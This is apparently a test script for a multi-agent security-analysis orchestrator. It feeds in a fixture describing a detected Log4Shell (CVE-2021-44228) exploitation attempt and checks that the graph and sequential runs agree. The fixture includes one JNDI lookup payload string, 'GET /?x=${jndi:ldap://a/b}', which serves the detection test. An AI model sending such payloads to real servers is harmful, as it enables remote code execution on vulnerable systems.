from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.agent.orchestrator import run_agent_layer, run_agent_layer_sequential


def _analysis():
    return {
        "structured_events": [{"event_id": "pkt-1", "protocol": "HTTP", "summary": "GET /"}],
        "top_cves": [
            {
                "cve": "CVE-2021-44228",
                "score": 0.9,
                "rule_confirmed": True,
                "signals": ["log4shell_jndi"],
                "event_ids": ["pkt-1"],
                "evidence_details": [
                    {
                        "event_id": "pkt-1",
                        "neighbor_id": "demo-log4shell",
                        "neighbor_payload": "GET /?x=${jndi:ldap://a/b}",
                        "neighbor_labels": ["CVE-2021-44228"],
                    }
                ],
            }
        ],
        "attack_timeline": [{"event_id": "pkt-1", "timestamp": 1.0}],
        "attack_chain": [{"stage": "Exploitation", "confidence": "high", "evidence_ids": ["pkt-1"]}],
        "c2_findings": [],
        "impact_assessment": {
            "verdict": "Likely exploitation attempt",
            "confidence": "medium",
            "reasoning": "Exploit payload indicators and CVE evidence were observed.",
            "evidence_ids": ["pkt-1"],
        },
    }


def main() -> None:
    graph_result = run_agent_layer(_analysis())
    sequential_result = run_agent_layer_sequential(_analysis())
    assert graph_result["schema_version"] == "agent-v1"
    assert graph_result["mode"] == "deterministic"
    assert graph_result["orchestration"]["engine"] in {"langgraph", "sequential"}
    assert graph_result["orchestration"]["nodes"] == sequential_result["orchestration"]["nodes"]
    assert [item["agent"] for item in graph_result["agent_reasoning"]] == [
        "Investigator Agent",
        "Vulnerability Judge Agent",
        "Timeline Agent",
        "Impact Agent",
    ]
    assert graph_result["executive_summary"] == sequential_result["executive_summary"]


if __name__ == "__main__":
    main()
